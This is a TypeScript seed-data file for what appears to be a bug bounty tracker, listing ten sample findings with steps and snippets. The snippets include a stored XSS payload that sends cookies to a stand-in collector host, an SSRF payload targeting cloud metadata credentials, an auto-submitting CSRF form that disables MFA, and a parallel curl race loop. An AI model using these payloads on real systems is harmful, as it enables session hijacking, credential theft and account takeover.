import type { Severity } from './bounty-data';
import { DEFAULT_CVSS_METRICS, type CvssMetrics } from './cvss';

export type PipelineStatus =
  | 'lead' | 'testando' | 'confirmado' | 'report'
  | 'submetido' | 'aguardando info' | 'triado' | 'resolvido'
  | 'duplicado' | 'informativo' | 'N/A' | 'fora de escopo' | 'descartado';

export type PayoutStatus = 'não aplicável' | 'pendente' | 'pago';

export const PIPELINE_STATUS_GROUPS: { label: string; statuses: PipelineStatus[] }[] = [
  { label: 'Em andamento', statuses: ['lead', 'testando', 'confirmado', 'report'] },
  { label: 'Submetido', statuses: ['submetido', 'aguardando info', 'triado', 'resolvido'] },
  { label: 'Encerrado sem bounty', statuses: ['duplicado', 'informativo', 'N/A', 'fora de escopo', 'descartado'] },
];

export const PIPELINE_STATUSES: PipelineStatus[] = PIPELINE_STATUS_GROUPS.flatMap((group) => group.statuses);
export const PAYOUT_STATUSES: PayoutStatus[] = ['não aplicável', 'pendente', 'pago'];

export type CodeSnippet = {
  label: string;
  code: string;
};

export type Finding = {
  id: string;
  title: string;
  programId: string;
  asset: string;
  classification: string;
  severity: Severity;
  cvss: CvssMetrics;
  severityOverride: boolean;
  status: PipelineStatus;
  steps: string[];
  snippets: CodeSnippet[];
  impact: string;
  attachments: string[];
  reward: string;
  payoutStatus: PayoutStatus;
};

export const findings: Finding[] = [
  {
    id: 'account-takeover-oauth-state',
    title: 'Account takeover via OAuth state reuse',
    programId: 'h1-acme-cloud',
    asset: 'auth.acme-cloud.com/oauth/callback',
    classification: 'OWASP A07:2021 · CWE-352',
    severity: 'critical',
    cvss: { av: 'N', ac: 'L', pr: 'N', ui: 'N', scope: 'C', c: 'H', i: 'H', a: 'N' },
    severityOverride: false,
    status: 'triado',
    steps: [
      'Iniciar o fluxo de login social e capturar o parâmetro state emitido pelo servidor.',
      'Completar o login normalmente e reutilizar o mesmo state em uma segunda janela autenticada como outra vítima.',
      'Observar que o callback aceita o state reaproveitado e finaliza a sessão na conta da vítima.',
    ],
    snippets: [
      { label: 'request', code: 'GET /oauth/callback?code=AQC...&state=9f3e2b1c HTTP/1.1\nHost: auth.acme-cloud.com\nCookie: session=anon' },
      { label: 'observação', code: 'state não é invalidado após o primeiro uso nem vinculado à sessão que o originou.' },
    ],
    impact: 'Um atacante consegue assumir contas de qualquer usuário que tenha iniciado um login social recentemente, sem precisar de credenciais.',
    attachments: ['poc-oauth-state-reuse.mp4', 'burp-request-1.png'],
    reward: 'US$ 9.000',
    payoutStatus: 'pendente',
  },
  {
    id: 'idor-export-relatorios',
    title: 'IDOR em exportação de relatórios financeiros',
    programId: 'bc-fintech-web',
    asset: 'api.fintech.com/v2/reports/:id/export',
    classification: 'OWASP A01:2021 · CWE-639',
    severity: 'high',
    cvss: { av: 'N', ac: 'L', pr: 'N', ui: 'N', scope: 'U', c: 'H', i: 'N', a: 'N' },
    severityOverride: false,
    status: 'submetido',
    steps: [
      'Gerar um relatório com a conta de teste A e capturar o endpoint de exportação.',
      'Trocar o :id pelo identificador de um relatório pertencente à conta de teste B.',
      'Confirmar que o PDF é gerado e retornado sem validar o dono do recurso.',
    ],
    snippets: [
      { label: 'request', code: 'GET /v2/reports/48213/export HTTP/1.1\nHost: api.fintech.com\nAuthorization: Bearer <token-conta-A>' },
      { label: 'response', code: 'HTTP/1.1 200 OK\nContent-Type: application/pdf\nContent-Disposition: attachment; filename="relatorio-48213.pdf"' },
    ],
    impact: 'Exposição de dados financeiros sensíveis de outras contas, incluindo saldo e histórico de transações.',
    attachments: ['relatorio-48213-vazado.pdf', 'fluxo-idor.png'],
    reward: 'US$ 2.400',
    payoutStatus: 'não aplicável',
  },
  {
    id: 'cors-permissivo-perfil',
    title: 'CORS permissivo expõe dados de perfil',
    programId: 'h1-orbit-mobile',
    asset: 'api.orbit.app/v1/me',
    classification: 'OWASP A05:2021 · CWE-942',
    severity: 'medium',
    cvss: { av: 'N', ac: 'L', pr: 'N', ui: 'R', scope: 'U', c: 'L', i: 'N', a: 'N' },
    severityOverride: false,
    status: 'confirmado',
    steps: [
      'Enviar uma requisição para /v1/me com o header Origin apontando para um domínio arbitrário.',
      'Verificar que o servidor responde com Access-Control-Allow-Origin refletindo o domínio enviado e Allow-Credentials: true.',
      'Montar uma página de prova de conceito que lê os dados de perfil autenticado via fetch com credentials: "include".',
    ],
    snippets: [
      { label: 'request', code: 'GET /v1/me HTTP/1.1\nHost: api.orbit.app\nOrigin: https://atacante.example' },
      { label: 'response', code: 'Access-Control-Allow-Origin: https://atacante.example\nAccess-Control-Allow-Credentials: true' },
    ],
    impact: 'Qualquer site malicioso visitado pela vítima logada consegue ler nome, e-mail e telefone do perfil.',
    attachments: ['poc-cors.html'],
    reward: '',
    payoutStatus: 'não aplicável',
  },
  {
    id: 'ssrf-webhooks',
    title: 'SSRF no importador de webhooks',
    programId: 'int-platform-api',
    asset: 'api.platform.io/v1/webhooks/import',
    classification: 'OWASP A10:2021 · CWE-918',
    severity: 'high',
    cvss: { av: 'N', ac: 'L', pr: 'N', ui: 'N', scope: 'C', c: 'H', i: 'N', a: 'N' },
    severityOverride: false,
    status: 'report',
    steps: [
      'Cadastrar um webhook apontando para um endereço interno (169.254.169.254/latest/meta-data/).',
      'Disparar a validação automática do endpoint que o backend executa ao salvar o webhook.',
      'Coletar a resposta da requisição interna refletida na tela de erro de validação.',
    ],
    snippets: [
      { label: 'payload', code: 'POST /v1/webhooks/import\n{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }' },
    ],
    impact: 'Possível acesso a metadados da instância cloud e pivot para a rede interna do programa.',
    attachments: [],
    reward: '',
    payoutStatus: 'não aplicável',
  },
  {
    id: 'race-condition-cupons',
    title: 'Race condition no endpoint de resgate de cupons',
    programId: 'ywh-shadow-gateway',
    asset: 'gateway.shadow.io/v1/coupons/redeem',
    classification: 'OWASP A04:2021 · CWE-362',
    severity: 'medium',
    cvss: { av: 'N', ac: 'H', pr: 'N', ui: 'N', scope: 'U', c: 'N', i: 'H', a: 'N' },
    severityOverride: false,
    status: 'lead',
    steps: [
      'Disparar 20 requisições simultâneas de resgate do mesmo cupom de uso único.',
      'Verificar quantas delas retornam sucesso.',
    ],
    snippets: [
      { label: 'payload', code: 'for i in $(seq 1 20); do curl -s -X POST https://gateway.shadow.io/v1/coupons/redeem -d \'{"code":"WELCOME10"}\' & done; wait' },
    ],
    impact: 'Ainda em validação — suspeita de resgate múltiplo do mesmo cupom além do limite configurado.',
    attachments: [],
    reward: '',
    payoutStatus: 'não aplicável',
  },
  {
    id: 'enumeracao-convites',
    title: 'Enumeração de usuários no fluxo de convite',
    programId: 'vdp-northstar',
    asset: 'northstar.dev/invite',
    classification: 'OWASP A07:2021 · CWE-203',
    severity: 'low',
    cvss: { av: 'N', ac: 'H', pr: 'N', ui: 'N', scope: 'U', c: 'L', i: 'N', a: 'N' },
    severityOverride: false,
    status: 'resolvido',
    steps: [
      'Submeter e-mails conhecidos e desconhecidos no formulário de convite.',
      'Comparar o tempo de resposta e a mensagem de erro retornada para cada caso.',
    ],
    snippets: [
      { label: 'observação', code: 'E-mails já cadastrados retornam "Usuário já convidado" enquanto novos retornam "Convite enviado" — diferença de mensagem permite enumeração.' },
    ],
    impact: 'Permite confirmar quais e-mails possuem conta, útil para campanhas de phishing direcionadas.',
    attachments: [],
    reward: '',
    payoutStatus: 'não aplicável',
  },
  {
    id: 'stored-xss-editor-perfil',
    title: 'Stored XSS no editor de perfil',
    programId: 'h1-acme-cloud',
    asset: 'app.acme-cloud.com/settings/profile',
    classification: 'OWASP A03:2021 · CWE-79',
    severity: 'high',
    cvss: { av: 'N', ac: 'L', pr: 'L', ui: 'R', scope: 'C', c: 'H', i: 'L', a: 'N' },
    severityOverride: false,
    status: 'resolvido',
    steps: [
      'Editar o campo "bio" do perfil com um payload de XSS armazenado.',
      'Salvar o perfil e visitar a página pública do usuário.',
      'Confirmar a execução do script no contexto de qualquer visitante.',
    ],
    snippets: [
      { label: 'payload', code: '<img src=x onerror=fetch(`https://collector.test/c?c=${document.cookie}`)>' },
    ],
    impact: 'Roubo de sessão de qualquer visitante do perfil público, incluindo administradores.',
    attachments: ['poc-xss-perfil.png'],
    reward: 'US$ 3.200',
    payoutStatus: 'pago',
  },
  {
    id: 'csrf-toggle-mfa',
    title: 'CSRF ao desativar MFA',
    programId: 'bc-fintech-web',
    asset: 'app.fintech.com/settings/security',
    classification: 'OWASP A01:2021 · CWE-352',
    severity: 'medium',
    cvss: { av: 'N', ac: 'L', pr: 'N', ui: 'R', scope: 'U', c: 'N', i: 'H', a: 'N' },
    severityOverride: false,
    status: 'testando',
    steps: [
      'Montar uma página externa com um formulário auto-submit para POST /settings/security/mfa/disable.',
      'Fazer a vítima autenticada visitar a página enquanto a sessão estiver ativa.',
      'Confirmar que o MFA é desativado sem exigir token anti-CSRF nem confirmação de senha.',
    ],
    snippets: [
      { label: 'payload', code: '<form action="https://app.fintech.com/settings/security/mfa/disable" method="POST"><input type="submit"></form><script>document.forms[0].submit()</script>' },
    ],
    impact: 'Um atacante consegue desativar o MFA de uma vítima logada apenas fazendo-a abrir uma página, facilitando takeover subsequente.',
    attachments: [],
    reward: '',
    payoutStatus: 'não aplicável',
  },
  {
    id: 'leak-internal-api-key',
    title: 'API key interna exposta no bundle JS',
    programId: 'h1-orbit-mobile',
    asset: 'app.orbit.app (bundle.js)',
    classification: 'OWASP A02:2021 · CWE-798',
    severity: 'high',
    cvss: { av: 'N', ac: 'L', pr: 'N', ui: 'N', scope: 'C', c: 'H', i: 'N', a: 'N' },
    severityOverride: false,
    status: 'lead',
    steps: [
      'Baixar o bundle JS público da aplicação web.',
      'Buscar por padrões de chave de API em texto plano no arquivo minificado.',
    ],
    snippets: [
      { label: 'observação', code: 'Chave "orbit_internal_sk_live_..." encontrada em texto plano em bundle.js, ainda não confirmado o nível de acesso que ela concede.' },
    ],
    impact: 'Em validação — possível acesso a serviços internos caso a chave esteja realmente ativa.',
    attachments: [],
    reward: '',
    payoutStatus: 'não aplicável',
  },
  {
    id: 'open-redirect-login',
    title: 'Open redirect no parâmetro de retorno do login',
    programId: 'ywh-shadow-gateway',
    asset: 'gateway.shadow.io/login?return=',
    classification: 'OWASP A01:2021 · CWE-601',
    severity: 'low',
    cvss: { av: 'N', ac: 'H', pr: 'N', ui: 'R', scope: 'U', c: 'N', i: 'L', a: 'N' },
    severityOverride: false,
    status: 'report',
    steps: [
      'Acessar /login?return=https://atacante.example.',
      'Completar o login normalmente.',
      'Confirmar que o usuário é redirecionado para o domínio externo após autenticar.',
    ],
    snippets: [
      { label: 'request', code: 'GET /login?return=https://atacante.example HTTP/1.1\nHost: gateway.shadow.io' },
    ],
    impact: 'Pode ser usado em campanhas de phishing que abusam do domínio legítimo para redirecionar a um site malicioso após o login.',
    attachments: [],
    reward: '',
    payoutStatus: 'não aplicável',
  },
];

export function getFinding(id: string): Finding | undefined {
  return findings.find((f) => f.id === id);
}

export function createBlankFinding(id: string): Finding {
  return {
    id,
    title: '',
    programId: '',
    asset: '',
    classification: '',
    severity: 'medium',
    cvss: { ...DEFAULT_CVSS_METRICS },
    severityOverride: false,
    status: 'lead',
    steps: [],
    snippets: [],
    impact: '',
    attachments: [],
    reward: '',
    payoutStatus: 'não aplicável',
  };
}
